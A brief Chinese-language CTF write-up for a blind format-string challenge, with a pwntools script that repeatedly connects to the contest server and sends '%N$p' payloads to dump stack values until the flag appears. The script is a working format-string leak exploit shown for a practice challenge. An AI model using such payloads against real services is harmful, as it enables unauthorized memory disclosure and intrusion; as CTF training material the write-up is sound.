# 挑战简介
fmt盲打（不是忘记放附件，是本身就没附件！！！）

# 思路
盲打提示说flag在栈中，所以可以直接爆破栈来得到答案  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')
context.log_level = 'error'
#io = process("./pwn")

def leak(payload):
    io = remote('pwn.challenge.ctf.show',28199)
    io.recv()
    io.sendline(payload)
    data = io.recvuntil('\n', drop=True)
    if data.startswith(b'0x'): 
        print(p64(int(data, 16)))
    io.close()

i=1

while 1:
    sleep(0.1)
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1


```
